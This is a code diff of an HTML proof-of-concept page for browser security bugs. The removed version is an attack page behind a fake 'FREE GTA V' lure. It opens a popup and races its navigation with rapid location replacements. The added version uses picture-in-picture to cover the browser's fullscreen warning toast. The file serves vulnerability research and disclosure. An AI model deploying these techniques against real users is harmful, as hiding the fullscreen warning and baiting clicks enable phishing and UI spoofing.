@@ -1,22 +1,61 @@
+<!doctype html>
 <html>
-	<head>
-		<script>
-			function next() {
-				w.location.replace('https://www.epicgames.com/store/en-US/promotion/mega-sale/?'+n);
-				n++;
+<head>
+  <meta charset="utf-8" />
+  <title>PiP hides fullscreen toast — parent</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <style>
+    body { margin:0; font-family: sans-serif; display:flex; flex-direction:column; align-items:center; gap:12px; padding:20px; }
+    video { width:360px; height:200px; background:#000; }
+    iframe { width:800px; height:450px; border:1px solid #ccc; }
+    .controls { display:flex; gap:8px; }
+    button { padding:8px 12px; font-size:14px; }
+  </style>
+</head>
+<body>
+  <h2>PiP cover + Fullscreen PoC</h2>
 
-				setTimeout("next();",15);
-				setTimeout("next();",25);
-			}
+  <video id="v" controls crossorigin="anonymous" playsinline>
+    <!-- small demo mp4; replace with your test file, or use a data: URI -->
+    <source src="https://interactive-examples.mdn.mozilla.net/media/cc0-videos/flower.mp4" type="video/mp4">
+    Video not supported.
+  </video>
 
-			function f() {
-				w = window.open("attack1.html", "_blank", "width=500 height=500");
-				i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); n = 0; next(); }", 5);
-			}
-		</script>
-	</head>
+  <div class="controls">
+    <button id="enterPip">Enter PiP (user gesture)</button>
+    <button id="positionPip">Move PiP to top-right (overlay test)</button>
+    <button id="focusIframe">Click here then click inside iframe to fullscreen</button>
+  </div>
 
-	<body>
-		<a href="#" onclick="f()">FREE GTA V - VALID TILL 21st MAY</a>
-	</body>
+  <p>Below is an iframe (child). Click the PiP button first, then click inside the iframe’s button to request fullscreen.</p>
+
+  <!-- allowfullscreen so iframe can go fullscreen -->
+  <iframe id="child" src="child.html" allowfullscreen></iframe>
+
+  <script>
+    const v = document.getElementById('v');
+    const btnPip = document.getElementById('enterPip');
+    const btnPos = document.getElementById('positionPip');
+
+    btnPip.addEventListener('click', async () => {
+      try {
+        // user gesture required
+        if (v !== document.pictureInPictureElement) {
+          await v.requestPictureInPicture();
+          console.log('Entered PiP');
+        } else {
+          await document.exitPictureInPicture();
+        }
+      } catch (e) {
+        console.error(e);
+      }
+    });
+
+    // Some browsers allow repositioning PiP via user drag — but for testing,
+    // instruct tester to drag PiP to the top area manually if repositioning isn't exposed.
+    btnPos.addEventListener('click', () => {
+      alert('Move the PiP window (drag it) to the top-right / top area so it can cover the browser\'s fullscreen toast. If your browser restricts PiP movement, drag manually.');
+    });
+  </script>
+</body>
 </html>
